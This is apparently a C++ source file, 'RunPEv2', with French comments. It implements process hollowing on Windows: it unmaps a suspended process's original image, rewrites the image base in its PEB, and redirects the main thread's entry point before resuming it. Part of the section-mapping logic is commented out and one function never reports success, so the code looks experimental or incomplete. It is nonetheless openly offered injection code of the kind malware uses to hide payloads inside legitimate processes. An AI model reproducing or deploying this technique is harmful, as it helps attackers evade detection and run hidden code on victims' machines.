#include "stdafx.h"
#include "sysutils.h"
#include "RunPEv2.h"

DWORD MapFileFromNameEx(HANDLE hProcess, LPCWSTR swFilePath, PMAPPEDFILE mFile)
{
	BOOL bSuccess = FALSE;
	LARGE_INTEGER SectionOffset;
	ZeroMemory(&SectionOffset, sizeof(LARGE_INTEGER));
	SIZE_T ViewSize = 0;
	DWORD BaseAddress = 0;
	memset(mFile, 0, sizeof(MAPPEDFILE));

	mFile->hFile = CreateFile(swFilePath, GENERIC_READ | GENERIC_EXECUTE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (mFile->hFile != INVALID_HANDLE_VALUE)
	{
		mFile->dwFileSize = GetFileSize(mFile->hFile, NULL);
		if (mFile->dwFileSize != 0)
		{
			mFile->hMapFile = CreateFileMapping(/*mFile->hFile*/INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_WRITECOPY | SEC_IMAGE, 0, mFile->dwFileSize, NULL);
			if (mFile->hMapFile != NULL)
			{
				NTSTATUS status = NtMapViewOfSection(mFile->hMapFile, hProcess,(PVOID*)&BaseAddress, 0, 0, &SectionOffset, &ViewSize,ViewShare, 0, 8);
				mFile->lpView = (LPVOID)BaseAddress;
				printf("NtStatus : %x\n", status);
				printf("VIEW : %p\n", mFile->lpView);
				/*
				mFile->lpView = MapViewOfFileEx(mFile->hMapFile, FILE_MAP_ALL_ACCESS, 0, 0, 0, 0);
				if (mFile->lpView != NULL)
				bSuccess = TRUE;
				else
				fprintf(stderr, "[-] MapViewOfFile\n");
				*/
			}
			else
				fprintf(stderr, "[-] Error when CreateFileMapping\n");
		}
		else
			fprintf(stderr, "[-] Can't GetFileSize\n");
	}
	else
		fprintf(stderr, "[-] Can't OpenFile\n");

	return bSuccess;
}

DWORD InjectPEv2(LPPROCESS_INFORMATION pProcessInfo, PVOID Buffer, DWORD SizeOfBuffer)
{
	DWORD dwOldProtect;
	PEB Peb;
	WOW64_CONTEXT Context;
	BOOL bSucess = FALSE;

	ZeroMemory(&Context, sizeof(WOW64_CONTEXT));
	Context.ContextFlags = CONTEXT_FULL;

	/* Recupère le contexte du thread principal */
	if (!Wow64GetThreadContext(pProcessInfo->hThread, &Context))
	{
		fprintf(stderr, "[-] GetThreadContext failed\n");
		return -1;
	}

	printf("Context :\n");
	printf("\t- EIP : 0x%x\n", Context.Eip); // ntdll_xxxxxxxx!RtlUserThreadStart
	printf("\t- EAX : 0x%x\n", Context.Eax); // Image EntryPoint
	printf("\t- EBX : 0x%x\n", Context.Ebx); // ImageBase
	printf("\t- ECX : 0x%x\n", Context.Ecx);
	printf("\t- EDX : 0x%x\n", Context.Edx);
	printf("\t- EDI : 0x%x\n", Context.Edi);
	printf("\t- ESI : 0x%x\n", Context.Esi);
	printf("\t- EBP : 0x%x\n", Context.Ebp);
	printf("\t- ESP : 0x%x\n", Context.Esp);

	/* Lit le Process Environment Block du processus cible */
	if (!ReadProcessMemory(pProcessInfo->hProcess, LPCVOID(Context.Ebx), LPVOID(&Peb), sizeof(PEB), NULL))
	{
		fprintf(stderr, "[-] ReadProcessMemory failed\n");
		return -1;
	}

	PIMAGE_DOS_HEADER IDH = PIMAGE_DOS_HEADER(Buffer); //Entête DOS
	PIMAGE_NT_HEADERS32 INH = PIMAGE_NT_HEADERS32(DWORD(Buffer) + IDH->e_lfanew); // Entête NT

	printf("Machine : %x\n", INH->FileHeader.Machine);
	printf("NumberOfSections : %d\n", INH->FileHeader.NumberOfSections);

	printf("UnmapView at %x\n", Peb.Reserved3[1]);
	/* Libère l'ancienne image du processus */
	if (NtUnmapViewOfSection(pProcessInfo->hProcess, Peb.Reserved3[1]) != 0)
	{
		fprintf(stderr, "[-] NtUnmapViewOfSection failed\n");
		return -1;
	}

	/* Realloue de la mémoire pour la nouvelle image du processus */
	DWORD pImageBase = (DWORD)Peb.Reserved3[1];



	// Remappe chaque sections au bon endroit
	// ImageBase + RVA de la section
	/*
	for (int i = 0; i < INH->FileHeader.NumberOfSections; i++)
	{
	PIMAGE_SECTION_HEADER ISH = PIMAGE_SECTION_HEADER(DWORD(Buffer) + IDH->e_lfanew + sizeof(IMAGE_NT_HEADERS32) + (i * sizeof(IMAGE_SECTION_HEADER)));

	printf("Section %s : \n", ISH->Name);
	printf("\t- Virtual Address : 0x%x\n", ISH->VirtualAddress);
	printf("\t- Raw Size : %d\n", ISH->SizeOfRawData);
	printf("\t- Pointer to Raw Data : 0x%x\n", ISH->PointerToRawData);
	printf("\t- Characteristics : %x\n", ISH->Characteristics);

	memcpy((LPVOID)((DWORD)fileView + ISH->VirtualAddress),(LPVOID)((DWORD)Buffer + ISH->PointerToRawData),ISH->SizeOfRawData);
	}

	ViewSize = SizeOfBuffer;
	NTSTATUS Status = NtMapViewOfSection(hFileMapping, pProcessInfo->hProcess, &pImageBase, 0, 0, &SectionOffset, &ViewSize, 1, 0, (SECTION_MAP_EXECUTE_EXPLICIT | FILE_MAP_COPY) + 0x5F);
	if (!NT_SUCCESS(Status))
	{
	fprintf(stderr, "[-] NtMapViewOfSection return code : %lx\n", Status);
	return 0;
	}

	printf("ImageBase : %p\n", pImageBase);
	*/

	// On met à jour le Process Environement Block
	bSucess = WriteProcessMemory(pProcessInfo->hProcess, LPVOID(Context.Ebx + FIELD_OFFSET(PEB, Reserved3[1])), LPVOID(&pImageBase), sizeof(LPVOID), NULL);
	if (!bSucess)
	{
		fprintf(stderr, "[-] WriteProcessMemory failed\n");
		return -1;
	}


	/*
	* Le thread est en suspend sur ntdll_xxxxxxxx!RtlUserThreadStart
	* Avec Windbg (x64)
	* u ntdll_xxxxxxxx!RtlUserThreadStart
	* 00000000`xxxxxxxx 89442404        mov     dword ptr [rsp+4],eax <--- image EntryPoint
	* 00000000`xxxxxxxx 895c2408        mov     dword ptr [rsp+8],ebx <--- image base
	* 00000000`xxxxxxxx e9e9960200      jmp     ntdll_xxxxxxxx!_RtlUserThreadStart
	*/
	Context.Ebx = (DWORD)pImageBase;

	/*
	* [!] A la reprise du thread,
	* le processus ajoute à EAX l'offset entre image base rélle et celle désirée,
	* il faut donc mettre l'adresse de l'entry point désiré (et non réel)
	*/
	Context.Eax = INH->OptionalHeader.ImageBase + INH->OptionalHeader.AddressOfEntryPoint;
	printf("EntryPoint : 0x%x\n", Context.Eax);

	/* On met à jour le contexte du thread principal */
	bSucess = Wow64SetThreadContext(pProcessInfo->hThread, PWOW64_CONTEXT(&Context));
	if (!bSucess)
	{
		fprintf(stderr, "[-] SetThreadContext failed\n");
		return -1;
	}

	/* Reprise du thread principal */
	ResumeThread(pProcessInfo->hThread);
	return 0;
}